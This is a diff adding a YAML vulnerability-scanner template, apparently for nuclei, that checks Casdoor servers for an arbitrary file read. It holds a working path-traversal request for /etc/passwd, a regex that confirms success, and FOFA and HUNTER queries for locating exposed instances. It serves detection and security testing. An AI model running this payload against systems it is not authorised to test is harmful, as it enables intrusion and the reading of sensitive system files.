@@ -1,0 +1,25 @@
+id: casdoor-static-fileread
+
+info:
+  name: Casdoor 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  description: |-
+    HUNTER: web.title="Casdoor"
+    FOFA: title="Casdoor"
+  tags: casdoor,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/../../../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
+        part: body
